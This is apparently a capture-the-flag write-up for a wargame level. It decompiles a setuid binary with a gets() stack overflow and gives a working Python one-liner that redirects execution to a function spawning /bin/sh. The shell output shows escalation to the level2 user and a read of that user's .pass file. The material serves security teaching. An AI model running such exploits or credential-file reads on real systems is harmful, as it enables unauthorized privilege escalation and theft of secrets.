```sh
$> ls -l ~
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

Decompilation of `level1`:

```c
void	run(void)
{
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  system("/bin/sh");
}

void	main(void)
{
  char	s[76];
  
  gets(s);
}
```

The use of `gets()` is a security risk.  
In this case, we can use this vulnerability to gain 'level2' access.
We retrieve the address of `run()` and we overflow the buffer with 76 chars + the address of the function.

```sh
$> (python -c "print('a' * 76 +'\x44\x84\x04\x08')"; cat) | ./level1
Good... Wait what?
$ whoami
level2
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
$ ^C
Segmentation fault (core dumped)
```
